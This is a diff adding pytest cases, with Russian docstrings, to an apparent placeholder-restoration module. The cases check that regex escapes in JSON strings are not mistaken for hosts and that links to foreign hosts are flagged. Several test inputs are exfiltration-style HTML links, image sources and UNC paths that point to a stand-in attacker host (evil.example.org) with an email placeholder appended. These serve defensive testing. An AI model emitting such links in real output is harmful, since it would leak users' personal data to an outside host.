@@ -705,6 +705,43 @@ def test_own_links_and_paths_with_backslashes_are_restored(settings, answer, res
 
 
 @pytest.mark.parametrize(
+    "answer, restored",
+    [
+        (r'"pattern": ".*\\.host-1\\.domain-1\\.example"', r'"pattern": ".*\\.srv-dc01\\.contoso\\.ru"'),
+        (r'"pattern": "\\bhost-1\\.domain-1\\.example\\b"', r'"pattern": "\\bsrv-dc01\\.contoso\\.ru\\b"'),
+        (r'"pattern": "(\\.|^)domain-1\\.example$"', r'"pattern": "(\\.|^)contoso\\.ru$"'),
+        (
+            r'{"re": "\\bwww\\.domain-1\\.example\\b", "owner": "<EMAIL_1>"}',
+            r'{"re": "\\bwww\\.contoso\\.ru\\b", "owner": "ivanov@contoso.ru"}',
+        ),
+    ],
+)
+def test_regex_escapes_in_a_json_string_are_not_a_foreign_host(settings, answer, restored):
+    """Наблюдение раунда 5, P3: в регулярном выражении внутри строки JSON «\\\\» после знака выражения («.*\\\\.») или
+    перед «b» читалась как начало адреса без схемы, и имя через «\\\\.» не восстанавливалось. «\\» кончает хост (WHATWG
+    URL, путь UNC), и точка сразу за ней — уже не точка хоста; хост «\\\\.host-1» и «\\\\bhost-1» — одно имя без домена."""
+    result = restore(link_state(), answer, settings)
+    assert result.text == restored and "foreign_link" not in kinds(result)
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
+        r'<a href="\\evil.example.org\x?q=<EMAIL_1>">',
+        r'<img src="\\.evil.example.org\<EMAIL_1>">',
+        r'"pattern": ".*\\.evil.example.org\<EMAIL_1>"',
+        r'"\\bevil.example.org\<EMAIL_1>"',
+        r"\\.evil.example.org\share\<EMAIL_1>",
+    ],
+)
+def test_backslashes_before_a_dotted_host_still_lead_to_it(settings, answer):
+    """Та же находка с другой стороны: атрибут с «\\\\» в начале и имя с точками без «\\» перед ними после «\\\\», «\\\\.»
+    и «\\\\b» по-прежнему ведут на чужой узел."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
     "answer",
     [
         "<img src=\"https://evil.example.org/p?q=\n<EMAIL_1>\">",
